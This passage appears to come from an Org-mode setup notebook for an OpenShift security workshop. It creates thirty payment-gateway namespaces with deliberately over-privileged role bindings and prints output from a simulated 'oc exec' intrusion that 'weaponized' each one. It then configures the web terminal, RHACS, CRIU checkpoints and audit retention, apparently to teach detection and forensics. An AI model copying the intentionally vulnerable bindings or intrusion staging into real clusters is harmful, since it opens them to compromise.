rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-28 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-28 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-28 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-29 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-29 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-29 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
No resources found
project.project.openshift.io/payment-gateway-30 created
pod/payment-gateway created
serviceaccount/cicd-pipeline-runner-sa created
rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
role.rbac.authorization.k8s.io/container-executor created
rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-30 created
clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-30 created
rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
Waiting for all payment-gateway pods to initialize...
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
pod/payment-gateway condition met
Simulating live 'oc exec' intrusion across environments...
[+] Namespace payment-gateway-1 weaponized via simulated session execution.
[+] Namespace payment-gateway-2 weaponized via simulated session execution.
[+] Namespace payment-gateway-3 weaponized via simulated session execution.
[+] Namespace payment-gateway-4 weaponized via simulated session execution.
[+] Namespace payment-gateway-5 weaponized via simulated session execution.
[+] Namespace payment-gateway-6 weaponized via simulated session execution.
[+] Namespace payment-gateway-7 weaponized via simulated session execution.
[+] Namespace payment-gateway-8 weaponized via simulated session execution.
[+] Namespace payment-gateway-9 weaponized via simulated session execution.
[+] Namespace payment-gateway-10 weaponized via simulated session execution.
[+] Namespace payment-gateway-11 weaponized via simulated session execution.
[+] Namespace payment-gateway-12 weaponized via simulated session execution.
[+] Namespace payment-gateway-13 weaponized via simulated session execution.
[+] Namespace payment-gateway-14 weaponized via simulated session execution.
[+] Namespace payment-gateway-15 weaponized via simulated session execution.
[+] Namespace payment-gateway-16 weaponized via simulated session execution.
[+] Namespace payment-gateway-17 weaponized via simulated session execution.
[+] Namespace payment-gateway-18 weaponized via simulated session execution.
[+] Namespace payment-gateway-19 weaponized via simulated session execution.
[+] Namespace payment-gateway-20 weaponized via simulated session execution.
[+] Namespace payment-gateway-21 weaponized via simulated session execution.
[+] Namespace payment-gateway-22 weaponized via simulated session execution.
[+] Namespace payment-gateway-23 weaponized via simulated session execution.
[+] Namespace payment-gateway-24 weaponized via simulated session execution.
[+] Namespace payment-gateway-25 weaponized via simulated session execution.
[+] Namespace payment-gateway-26 weaponized via simulated session execution.
[+] Namespace payment-gateway-27 weaponized via simulated session execution.
[+] Namespace payment-gateway-28 weaponized via simulated session execution.
[+] Namespace payment-gateway-29 weaponized via simulated session execution.
[+] Namespace payment-gateway-30 weaponized via simulated session execution.
#+end_example


* Install web terminal operator

Participants are going to use the OpenShift Web Terminal to run commands in order to avoid having to do anything locally on their devices.

#+NAME: Install openshift web terminal
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: operators.coreos.com/v1alpha1
kind: Subscription
metadata:
  name: web-terminal
  namespace: openshift-operators
spec:
  channel: fast
  installPlanApproval: Automatic
  name: web-terminal
  source: redhat-operators
  sourceNamespace: openshift-marketplace
EOF
#+end_src

#+RESULTS: Install openshift web terminal
#+begin_example
subscription.operators.coreos.com/web-terminal created
#+end_example


* Enable collecting externalip in rhacs

We want to show how RHACS can make external traffic visible.

#+NAME: Enable rhacs externalip
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: v1
kind: ConfigMap
metadata:
  name: collector-config
  namespace: stackrox
data:
  runtime_config.yaml: |
    networking:
      externalIps:
        enabled: ENABLED
EOF
#+end_src


* Enable creating criu checkpoints

#+NAME: Rbac for criu
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: kube-apiserver-checkpoints
rules:
  - apiGroups:
      - ""
    resources:
      - nodes/checkpoint
    verbs:
      - get
      - create

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: kube-apiserver-checkpoints
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: kube-apiserver-checkpoints
subjects:
  - apiGroup: rbac.authorization.k8s.io
    kind: User
    name: kube-apiserver
  - apiGroup: rbac.authorization.k8s.io
    kind: User
    name: system:kube-apiserver
EOF
#+end_src

#+RESULTS: Rbac for criu
#+begin_example
clusterrole.rbac.authorization.k8s.io/kube-apiserver-checkpoints created
clusterrolebinding.rbac.authorization.k8s.io/kube-apiserver-checkpoints created
#+end_example


* Store checkpointctl in a bucket

#+NAME: Create bucket
#+begin_src bash
cat << EOF | oc apply --filename -
apiVersion: objectbucket.io/v1alpha1
kind: ObjectBucketClaim
metadata:
  name: workshop-assets
  namespace: openshift-storage
spec:
  generateBucketName: workshop-assets
  storageClassName: openshift-storage.noobaa.io
EOF
#+end_src

#+RESULTS: Create bucket
#+begin_example
#+end_example


Once the bucket exists we need to compile ~checkpointctl~ statically via ~make release~ on the source and upload the resulting binary to the bucket.

We can then generate a share link for the binary which needs to be updated into the lab instructions.


* Increase audit log retention

We are querying audit logs directly off control nodes, so we need to crank up the retention on the main ~audit.log~ file so events stick around.

We'll change from the default 10 100mb files to 3 2048mb files.

#+NAME: Increase audit log retention
#+begin_src bash
cat <<EOF | oc apply -f -
apiVersion: operator.openshift.io/v1
kind: KubeAPIServer
metadata:
  name: cluster
spec:
  unsupportedConfigOverrides:
    apiServerArguments:
      audit-log-maxsize:
        - "2048"
      audit-log-maxbackup:
        - "3"
EOF
#+end_src

#+RESULTS: Increase audit log retention
#+begin_example
kubeapiserver.operator.openshift.io/cluster configured
#+end_example
